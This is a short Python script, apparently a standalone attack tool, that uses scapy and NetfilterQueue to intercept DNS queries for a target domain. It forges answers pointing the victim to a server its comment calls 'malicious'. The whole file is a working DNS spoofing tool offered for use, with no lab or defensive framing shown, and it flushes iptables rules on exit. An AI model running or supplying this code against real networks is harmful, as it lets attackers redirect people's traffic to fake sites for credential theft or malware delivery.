#!/usr/bin/env python3
from scapy.all import *
from netfilterqueue import NetfilterQueue

# Define the target domain and fake IP
TARGET_DOMAIN = "example.com"
FAKE_IP = "192.168.1.105"  # Your malicious server's IP


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())  # Convert to Scapy packet

    if scapy_packet.haslayer(DNSQR):  # Check if it's a DNS request
        qname = scapy_packet[DNSQR].qname.decode()

        if TARGET_DOMAIN in qname:  # If the request matches our target domain
            print(f"[+] Spoofing DNS request for {qname}")

            # Craft a fake DNS response
            answer = DNSRR(rrname=qname, rdata=FAKE_IP)

            # Modify the original packet to include our fake answer
            spoofed_packet = IP(dst=scapy_packet[IP].src, src=scapy_packet[IP].dst) / \
                             UDP(dport=scapy_packet[UDP].sport, sport=53) / \
                             DNS(id=scapy_packet[DNS].id, qd=scapy_packet[DNS].qd, aa=1, qr=1, an=answer)

            packet.set_payload(bytes(spoofed_packet))  # Replace packet payload with spoofed packet

    packet.accept()  # Forward packet if no modification is needed


# Bind the function to NetfilterQueue
queue = NetfilterQueue()
queue.bind(1, process_packet)

try:
    print("[*] Starting DNS Spoofer...")
    queue.run()
except KeyboardInterrupt:
    print("\n[*] Stopping...")
    os.system("iptables --flush")
